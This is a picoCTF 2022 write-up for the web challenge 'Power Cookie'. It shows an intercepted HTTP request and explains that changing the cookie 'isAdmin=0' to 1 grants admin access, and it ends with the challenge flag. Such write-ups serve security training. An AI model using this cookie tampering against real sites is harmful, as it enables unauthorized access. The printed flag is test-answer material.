# picoCTF 2022 - Power Cookie (Web Exploitation)

## Description 

Can you get the flag?
Go to this [website](http://saturn.picoctf.net:52021/) and see what you can discover.

## Solution 

If I used a program like Burp Suite and intercepted the HTTP request, we can see the following. 

```HTTP
GET /check.php HTTP/1.1
Host: saturn.picoctf.net:52021
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.5359.125 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://saturn.picoctf.net:52021/
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: isAdmin=0
Connection: close
```

We can see that there is a `Cookie: isAdmin=0`. I changed that to 1 and I got the flag. 


## Flag 

`picoCTF{gr4d3_A_c00k13_65fd1e1a}`